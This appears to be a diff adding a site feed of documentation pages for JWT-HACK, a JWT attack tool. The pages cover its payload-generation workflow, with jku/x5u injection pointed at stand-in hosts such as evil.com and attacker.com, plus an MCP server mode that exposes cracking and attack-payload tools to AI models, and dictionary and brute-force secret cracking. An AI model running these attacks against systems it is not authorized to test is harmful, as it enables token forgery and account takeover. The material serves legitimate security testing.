+&lt;h3 id=&quot;sql-injection-in-kid&quot;&gt;SQL Injection in KID&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Generate KID SQL injection payloads
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=kid_sql
+
+# Test each payload for SQL injection responses
+# Monitor application logs for SQL errors
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;security-testing-workflow&quot;&gt;Security Testing Workflow&lt;/h2&gt;
+&lt;h3 id=&quot;1-reconnaissance&quot;&gt;1. Reconnaissance&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Decode token to understand structure
+jwt-hack decode &amp;lt;TOKEN&amp;gt;
+
+# Generate comprehensive payload set
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;2-systematic-testing&quot;&gt;2. Systematic Testing&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test none algorithm bypasses
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=none
+
+# Test each payload systematically
+# Document responses and behaviors
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;3-advanced-attacks&quot;&gt;3. Advanced Attacks&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Algorithm confusion (if RSA token)
+jwt-hack payload &amp;lt;RSA_TOKEN&amp;gt; --target=alg_confusion
+
+# URL manipulation attacks
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=jku --jwk-attack=controlled-domain.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;payload-customization&quot;&gt;Payload Customization&lt;/h2&gt;
+&lt;h3 id=&quot;custom-domains&quot;&gt;Custom Domains&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Use specific attack domains
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=jku --jwk-attack=evil.hacker.com
+
+# Bypass domain restrictions
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=x5u --jwk-trust=trusted.com --jwk-attack=evil.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;protocol-selection&quot;&gt;Protocol Selection&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Force HTTP for testing
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=jku --jwk-protocol=http --jwk-attack=attacker.com
+
+# Test protocol downgrade vulnerabilities
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;integration-with-testing-frameworks&quot;&gt;Integration with Testing Frameworks&lt;/h2&gt;
+&lt;h3 id=&quot;burp-suite-integration&quot;&gt;Burp Suite Integration&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Generate payloads with JWT-HACK&lt;/li&gt;
+&lt;li&gt;Import into Burp Intruder&lt;/li&gt;
+&lt;li&gt;Use as payload list for systematic testing&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;custom-scripts&quot;&gt;Custom Scripts&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Generate and test programmatically
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all &amp;gt; payloads.txt
+
+# Process payloads in custom testing script
+while read payload; do
+    test_jwt_payload &amp;quot;$payload&amp;quot;
+done &amp;lt; payloads.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;best-practices&quot;&gt;Best Practices&lt;/h2&gt;
+&lt;h3 id=&quot;responsible-testing&quot;&gt;Responsible Testing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Only test applications you own or have permission to test&lt;/li&gt;
+&lt;li&gt;Document all findings appropriately&lt;/li&gt;
+&lt;li&gt;Follow responsible disclosure practices&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;comprehensive-coverage&quot;&gt;Comprehensive Coverage&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Test all payload types systematically&lt;/li&gt;
+&lt;li&gt;Combine with other testing techniques&lt;/li&gt;
+&lt;li&gt;Verify results manually when automated tools indicate vulnerabilities&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>MCP Server Mode</title>
+      <link>http://localhost:3000/usage/commands/mcp/</link>
+      <guid>http://localhost:3000/usage/commands/mcp/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;mcp&lt;/code&gt; command runs JWT-HACK as a Model Context Protocol (MCP) server for AI model integration.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack mcp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;what-is-mcp&quot;&gt;What is MCP?&lt;/h2&gt;
+&lt;p&gt;Model Context Protocol (MCP) is a standardized protocol that enables AI models to interact with external tools and services. When JWT-HACK runs in MCP mode, it exposes its JWT analysis capabilities to AI models through a structured interface.&lt;/p&gt;
+&lt;h2 id=&quot;starting-the-mcp-server&quot;&gt;Starting the MCP Server&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Start MCP server on default port
+jwt-hack mcp
+
+# The server will:
+# - Listen for MCP connections
+# - Expose JWT-HACK functionality as MCP tools
+# - Process requests from AI models
+# - Return structured responses
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;available-mcp-tools&quot;&gt;Available MCP Tools&lt;/h2&gt;
+&lt;p&gt;When running as an MCP server, JWT-HACK exposes these tools to AI models:&lt;/p&gt;
+&lt;h3 id=&quot;jwt-analysis-tools&quot;&gt;JWT Analysis Tools&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;decode-jwt&lt;/strong&gt; - Decode and analyze JWT tokens&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;verify-jwt&lt;/strong&gt; - Verify JWT signatures&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;crack-jwt&lt;/strong&gt; - Attempt to crack JWT secrets&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;generate-payloads&lt;/strong&gt; - Create attack payloads&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;security-testing-tools&quot;&gt;Security Testing Tools&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;analyze-vulnerabilities&lt;/strong&gt; - Identify potential security issues&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;generate-reports&lt;/strong&gt; - Create security assessment reports&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;test-algorithms&lt;/strong&gt; - Test algorithm-specific vulnerabilities&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;integration-examples&quot;&gt;Integration Examples&lt;/h2&gt;
+&lt;h3 id=&quot;with-openai-models&quot;&gt;With OpenAI Models&lt;/h3&gt;
+&lt;p&gt;AI models can request JWT analysis through the MCP protocol:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AI Model Request: &amp;quot;Analyze this JWT token for security vulnerabilities&amp;quot;
+MCP Server: Executes decode, verify, and payload generation
+AI Model: Receives structured analysis results
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;with-local-ai-models&quot;&gt;With Local AI Models&lt;/h3&gt;
+&lt;p&gt;Compatible with local AI frameworks that support MCP:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Ollama&lt;/strong&gt; with MCP plugins&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LangChain&lt;/strong&gt; MCP integration&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Custom AI applications&lt;/strong&gt; using MCP protocol&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;mcp-protocol-features&quot;&gt;MCP Protocol Features&lt;/h2&gt;
+&lt;h3 id=&quot;structured-requests&quot;&gt;Structured Requests&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-json hljs&quot;&gt;{
+  &amp;quot;method&amp;quot;: &amp;quot;tools/call&amp;quot;,
+  &amp;quot;params&amp;quot;: {
+    &amp;quot;name&amp;quot;: &amp;quot;decode-jwt&amp;quot;,
+    &amp;quot;arguments&amp;quot;: {
+      &amp;quot;token&amp;quot;: &amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&amp;quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;structured-responses&quot;&gt;Structured Responses&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-json hljs&quot;&gt;{
+  &amp;quot;result&amp;quot;: {
+    &amp;quot;algorithm&amp;quot;: &amp;quot;HS256&amp;quot;,
+    &amp;quot;header&amp;quot;: {&amp;quot;alg&amp;quot;: &amp;quot;HS256&amp;quot;, &amp;quot;typ&amp;quot;: &amp;quot;JWT&amp;quot;},
+    &amp;quot;payload&amp;quot;: {&amp;quot;sub&amp;quot;: &amp;quot;1234&amp;quot;, &amp;quot;name&amp;quot;: &amp;quot;John Doe&amp;quot;},
+    &amp;quot;vulnerabilities&amp;quot;: [&amp;quot;weak_secret_suspected&amp;quot;],
+    &amp;quot;recommendations&amp;quot;: [&amp;quot;Use stronger secrets&amp;quot;, &amp;quot;Enable expiration&amp;quot;]
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;configuration&quot;&gt;Configuration&lt;/h2&gt;
+&lt;h3 id=&quot;server-configuration&quot;&gt;Server Configuration&lt;/h3&gt;
+&lt;p&gt;The MCP server can be configured through environment variables:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Set custom port
+export MCP_PORT=8080
+jwt-hack mcp
+
+# Enable debug logging
+export MCP_DEBUG=true
+jwt-hack mcp
+
+# Set custom timeout
+export MCP_TIMEOUT=30
+jwt-hack mcp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;ai-model-configuration&quot;&gt;AI Model Configuration&lt;/h3&gt;
+&lt;p&gt;Configure your AI model to connect to the JWT-HACK MCP server:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-json hljs&quot;&gt;{
+  &amp;quot;mcp_servers&amp;quot;: {
+    &amp;quot;jwt-hack&amp;quot;: {
+      &amp;quot;command&amp;quot;: &amp;quot;jwt-hack&amp;quot;,
+      &amp;quot;args&amp;quot;: [&amp;quot;mcp&amp;quot;],
+      &amp;quot;description&amp;quot;: &amp;quot;JWT security analysis and testing&amp;quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;use-cases&quot;&gt;Use Cases&lt;/h2&gt;
+&lt;h3 id=&quot;automated-security-analysis&quot;&gt;Automated Security Analysis&lt;/h3&gt;
+&lt;p&gt;AI models can perform comprehensive JWT security analysis:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Token Analysis&lt;/strong&gt; - Decode and examine token structure&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Vulnerability Detection&lt;/strong&gt; - Identify security weaknesses&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Attack Vector Generation&lt;/strong&gt; - Create targeted test payloads&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Report Generation&lt;/strong&gt; - Summarize findings and recommendations&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;interactive-security-testing&quot;&gt;Interactive Security Testing&lt;/h3&gt;
+&lt;p&gt;Enable conversational security testing:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;User: &amp;quot;Is this JWT token secure?&amp;quot;
+AI + MCP: Analyzes token, identifies issues, suggests improvements
+User: &amp;quot;Show me attack payloads for testing&amp;quot;
+AI + MCP: Generates and explains relevant attack vectors
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;automated-penetration-testing&quot;&gt;Automated Penetration Testing&lt;/h3&gt;
+&lt;p&gt;Integrate into automated testing workflows:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CI/CD Pipelines&lt;/strong&gt; - Analyze JWTs in automated tests&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Security Scanners&lt;/strong&gt; - Add JWT analysis capabilities&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Monitoring Systems&lt;/strong&gt; - Continuous JWT security assessment&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;benefits-of-mcp-integration&quot;&gt;Benefits of MCP Integration&lt;/h2&gt;
+&lt;h3 id=&quot;for-ai-models&quot;&gt;For AI Models&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Access to specialized JWT security expertise&lt;/li&gt;
+&lt;li&gt;Structured, reliable security analysis&lt;/li&gt;
+&lt;li&gt;Real-time vulnerability assessment&lt;/li&gt;
+&lt;li&gt;Consistent security recommendations&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;for-security-teams&quot;&gt;For Security Teams&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Natural language interaction with security tools&lt;/li&gt;
+&lt;li&gt;Automated analysis and reporting&lt;/li&gt;
+&lt;li&gt;Integration with existing AI workflows&lt;/li&gt;
+&lt;li&gt;Scalable security testing&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;
+&lt;h3 id=&quot;protocol-compliance&quot;&gt;Protocol Compliance&lt;/h3&gt;
+&lt;p&gt;JWT-HACK&apos;s MCP server implements:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;MCP 1.0 specification&lt;/strong&gt; compliance&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;JSON-RPC 2.0&lt;/strong&gt; message format&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WebSocket&lt;/strong&gt; transport layer&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Tool discovery&lt;/strong&gt; and capability advertisement&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;performance-characteristics&quot;&gt;Performance Characteristics&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Low latency&lt;/strong&gt; - Fast response times for analysis&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Concurrent requests&lt;/strong&gt; - Handle multiple AI model connections&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Resource efficient&lt;/strong&gt; - Minimal memory and CPU overhead&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scalable&lt;/strong&gt; - Support for high-volume analysis&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;h3 id=&quot;connection-issues&quot;&gt;Connection Issues&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Check if MCP server is running
+netstat -ln | grep :8080
+
+# Test MCP connection manually
+curl -X POST http://localhost:8080/mcp
+
+# Enable debug logging
+MCP_DEBUG=true jwt-hack mcp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;ai-model-integration&quot;&gt;AI Model Integration&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify AI model can discover tools
+# Check MCP protocol compatibility
+# Validate request/response formats
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;development-and-extensions&quot;&gt;Development and Extensions&lt;/h2&gt;
+&lt;h3 id=&quot;custom-mcp-tools&quot;&gt;Custom MCP Tools&lt;/h3&gt;
+&lt;p&gt;The MCP server architecture allows for extending JWT-HACK with custom tools:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-rust hljs&quot;&gt;// Example: Add custom JWT analysis tool
+impl McpTool for CustomJwtAnalyzer {
+    fn name(&amp;amp;self) -&amp;gt; &amp;amp;str { &amp;quot;custom-analysis&amp;quot; }
+    fn execute(&amp;amp;self, args: Value) -&amp;gt; Result&amp;lt;Value&amp;gt; {
+        // Custom JWT analysis logic
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;protocol-extensions&quot;&gt;Protocol Extensions&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Custom error handling&lt;/li&gt;
+&lt;li&gt;Extended metadata support&lt;/li&gt;
+&lt;li&gt;Streaming responses for long operations&lt;/li&gt;
+&lt;li&gt;Batch processing capabilities&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;/h2&gt;
+&lt;h3 id=&quot;access-control&quot;&gt;Access Control&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;MCP server runs locally by default&lt;/li&gt;
+&lt;li&gt;Consider network security for remote access&lt;/li&gt;
+&lt;li&gt;Implement authentication for production use&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;data-privacy&quot;&gt;Data Privacy&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;JWT tokens are processed locally&lt;/li&gt;
+&lt;li&gt;No data transmitted to external services&lt;/li&gt;
+&lt;li&gt;Full control over sensitive token analysis&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Crack Command</title>
+      <link>http://localhost:3000/usage/commands/crack/</link>
+      <guid>http://localhost:3000/usage/commands/crack/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;crack&lt;/code&gt; command attempts to discover JWT secrets using dictionary attacks or brute force methods.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack crack [OPTIONS] &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;dictionary-attack&quot;&gt;Dictionary Attack&lt;/h2&gt;
+&lt;p&gt;Use a wordlist to crack JWT secrets:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Basic dictionary attack
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt;
+
+# Use custom wordlist
+jwt-hack crack --wordlist=/path/to/custom/wordlist.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;brute-force-attack&quot;&gt;Brute Force Attack&lt;/h2&gt;
+&lt;p&gt;Generate and test password combinations:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Brute force up to 4 characters
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4
+
+# Brute force up to 6 characters (longer runtime)
+jwt-hack crack --mode=brute &amp;lt;TOKEN&amp;gt; --max=6
+
+# Use all CPU cores for faster cracking
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4 --power
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;attack-modes&quot;&gt;Attack Modes&lt;/h2&gt;
+&lt;h3 id=&quot;dictionary-mode-default&quot;&gt;Dictionary Mode (Default)&lt;/h3&gt;
+&lt;p&gt;Uses a wordlist file to test potential secrets:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack crack -w passwords.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Wordlist Requirements:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Plain text file&lt;/li&gt;
+&lt;li&gt;One password per line&lt;/li&gt;
+&lt;li&gt;No size limit (handles large files efficiently)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;brute-force-mode&quot;&gt;Brute Force Mode&lt;/h3&gt;
+&lt;p&gt;Generates combinations of characters:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Character Sets:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Lowercase letters (a-z)&lt;/li&gt;
+&lt;li&gt;Uppercase letters (A-Z)&lt;/li&gt;
+&lt;li&gt;Numbers (0-9)&lt;/li&gt;
+&lt;li&gt;Special characters (!@#$%^&amp;amp;*)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;performance-options&quot;&gt;Performance Options&lt;/h2&gt;
+&lt;h3 id=&quot;concurrency-control&quot;&gt;Concurrency Control&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Set custom thread count
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; -c 10
+
+# Use maximum CPU cores
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; --power
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;progress-monitoring&quot;&gt;Progress Monitoring&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Enable verbose output
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; --verbose
+
+# Shows:
+# - Current password being tested
+# - Progress percentage
+# - Estimated time remaining
+# - Passwords tested per second
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;command-options&quot;&gt;Command Options&lt;/h2&gt;
+&lt;h3 id=&quot;required&quot;&gt;Required&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;TOKEN&amp;gt;&lt;/code&gt; - The JWT token to crack&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;attack-mode-options&quot;&gt;Attack Mode Options&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-w, --wordlist &amp;lt;FILE&amp;gt;&lt;/code&gt; - Path to wordlist file&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-m, --mode &amp;lt;MODE&amp;gt;&lt;/code&gt; - Attack mode: dictionary (default) or brute&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;performance-options-1&quot;&gt;Performance Options&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-c, --concurrency &amp;lt;NUM&amp;gt;&lt;/code&gt; - Number of threads (default: 20)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--max &amp;lt;LENGTH&amp;gt;&lt;/code&gt; - Maximum length for brute force (default: 4)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--power&lt;/code&gt; - Use all available CPU cores&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--verbose&lt;/code&gt; - Show detailed progress information&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;compressed-token-support&quot;&gt;Compressed Token Support&lt;/h2&gt;
+&lt;p&gt;JWT-HACK automatically handles DEFLATE-compressed tokens:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Crack compressed JWT (detected automatically)
+jwt-hack crack -w wordlist.txt &amp;lt;COMPRESSED_TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The tool will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Detect compression automatically&lt;/li&gt;
+&lt;li&gt;Decompress during verification&lt;/li&gt;
+&lt;li&gt;Crack the original uncompressed secret&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
+&lt;h3 id=&quot;dictionary-attack-examples&quot;&gt;Dictionary Attack Examples&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Common passwords wordlist
+jwt-hack crack -w /usr/share/wordlists/rockyou.txt &amp;lt;TOKEN&amp;gt;
+
+# Custom application-specific wordlist
+jwt-hack crack -w app-secrets.txt &amp;lt;TOKEN&amp;gt;
+
+# SecLists common passwords
+jwt-hack crack -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;brute-force-examples&quot;&gt;Brute Force Examples&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Quick 3-character brute force
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=3
+
+# Intensive 5-character with all cores
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=5 --power --verbose
+
+# Custom thread count
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4 -c 8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;targeted-attacks&quot;&gt;Targeted Attacks&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test common weak secrets first
+echo -e &amp;quot;secret\npassword\ntest\n123456\nkey&amp;quot; | jwt-hack crack -w /dev/stdin &amp;lt;TOKEN&amp;gt;
+
+# Application-specific patterns
+jwt-hack crack -w company-keywords.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;wordlist-creation&quot;&gt;Wordlist Creation&lt;/h2&gt;
+&lt;h3 id=&quot;generate-custom-wordlists&quot;&gt;Generate Custom Wordlists&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Company/application-specific terms
+echo -e &amp;quot;company\nappname\napi\ndev\ntest\nprod&amp;quot; &amp;gt; custom.txt
+
+# Common patterns with variations
+echo -e &amp;quot;secret123\npassword1\nkey2023\napi_key&amp;quot; &amp;gt; patterns.txt
+
+# Combine multiple wordlists
+cat wordlist1.txt wordlist2.txt &amp;gt; combined.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;recommended-wordlists&quot;&gt;Recommended Wordlists&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;RockYou&lt;/strong&gt; - Most common passwords from breaches&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SecLists&lt;/strong&gt; - Comprehensive security testing wordlists&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Custom Lists&lt;/strong&gt; - Application-specific terms and patterns&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;success-output&quot;&gt;Success Output&lt;/h2&gt;
+&lt;p&gt;When a secret is found:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;🎉 SECRET FOUND!
+Secret: mysecret123
+Time taken: 2.5 seconds
+Passwords tested: 1,247
+&lt;/code&gt;&lt;/pre&gt;2 id=&quot;performance-tips&quot;&gt;Performance Tips&lt;/h2&gt;
+&lt;h3 id=&quot;dictionary-attacks&quot;&gt;Dictionary Attacks&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Use targeted wordlists for faster results&lt;/li&gt;
+&lt;li&gt;Start with common passwords&lt;/li&gt;
+&lt;li&gt;Sort wordlists by frequency/likelihood&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;brute-force-attacks&quot;&gt;Brute Force Attacks&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Start with shorter lengths (3-4 chars)&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;--power&lt;/code&gt; flag for maximum performance&lt;/li&gt;
+&lt;li&gt;Consider time vs. likelihood trade-offs&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;general-optimization&quot;&gt;General Optimization&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Use SSD storage for large wordlists&lt;/li&gt;
+&lt;li&gt;Ensure adequate RAM for concurrent operations&lt;/li&gt;
+&lt;li&gt;Monitor CPU usage with &lt;code&gt;--verbose&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;/h2&gt;
+&lt;h3 id=&quot;responsible-disclosure&quot;&gt;Responsible Disclosure&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Only crack tokens you own or have permission to test&lt;/li&gt;
+&lt;li&gt;Follow responsible disclosure for vulnerabilities&lt;/li&gt;
+&lt;li&gt;Document findings appropriately&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;rate-limiting&quot;&gt;Rate Limiting&lt;/h3&gt;
+&lt;p&gt;Be aware of potential rate limiting when testing live applications:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Some applications may detect brute force attempts&lt;/li&gt;
+&lt;li&gt;Use appropriate delays if testing against live systems&lt;/li&gt;
+&lt;li&gt;Consider offline token analysis first&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Verify Command</title>
+      <link>http://localhost:3000/usage/commands/verify/</link>
+      <guid>http://localhost:3000/usage/commands/verify/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;verify&lt;/code&gt; command validates JWT token signatures and optionally checks expiration claims.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
